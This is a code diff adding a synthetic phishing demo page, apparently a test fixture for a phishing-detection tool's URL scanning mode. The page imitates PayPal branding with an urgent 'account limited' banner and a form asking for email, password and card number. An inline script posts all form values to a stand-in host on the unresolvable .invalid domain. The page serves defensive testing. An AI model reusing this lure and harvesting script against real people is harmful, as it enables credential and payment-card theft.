@@ -1,0 +1,58 @@
+<!doctype html>
+<!--
+  ============================================================
+  SYNTHETIC DEMO PAGE - NOT A REAL PHISHING SITE.
+  Built to exercise Preflight's URL mode locally:
+    * brand claim on an unrelated domain (localhost)
+    * urgent-limitation banner + password form
+    * inline "exfiltration" script targeting a .invalid host
+      (.invalid is a reserved TLD - it can never resolve, so
+       this page is non-functional as an attack tool)
+  Serve via the app itself:  http://127.0.0.1:8000/static/demo/phish.html
+  and scan that URL with URL mode (PREFLIGHT_ALLOW_PRIVATE_URLS=1).
+  ============================================================
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>PayPal Security Center - Verify your account now</title>
+</head>
+<body style="font-family:Arial,Helvetica,sans-serif;background:#f2f2f2;margin:0">
+  <div style="background:#003087;color:#fff;padding:18px 32px;font-size:22px;font-weight:bold">
+    PayPa1&#8482; Secure Center
+  </div>
+  <div style="background:#ffb91d;padding:12px 32px;font-weight:bold;color:#5c4400">
+    &#9888; Your account has been LIMITED. Verify your identity within 24 hours or your account will be permanently closed.
+  </div>
+  <div style="max-width:560px;margin:32px auto;background:#fff;padding:28px;border-radius:8px">
+    <h1>Confirm your identity</h1>
+    <p>Dear customer,</p>
+    <p>We detected unusual activity in your account. To restore full access, please confirm
+       your login details below. Failure to verify within <b>24 hours</b> will result in
+       permanent account closure.</p>
+    <form action="/verify" method="post">
+      <p><label>Email address<br><input type="email" name="email" style="width:100%"></label></p>
+      <p><label>Password<br><input type="password" name="password" style="width:100%"></label></p>
+      <p><label>Card number<br><input type="text" name="card" style="width:100%"></label></p>
+      <p><button type="submit" style="background:#003087;color:#fff;padding:10px 24px;border:0">Verify Now</button></p>
+    </form>
+    <p><a href="/help">Help Center</a> &middot; <a href="/contact">Contact Support</a></p>
+  </div>
+  <script>
+    // DEMO ONLY - target uses the reserved .invalid TLD and can never be reached
+    (function () {
+      var btn = document.querySelector("button[type=submit]");
+      if (btn) {
+        btn.addEventListener("click", function () {
+          var data = {};
+          document.querySelectorAll("input").forEach(function (i) { data[i.name] = i.value; });
+          fetch("http://collect.metrics-secure.invalid/steal", {
+            method: "POST",
+            body: JSON.stringify(data)
+          });
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
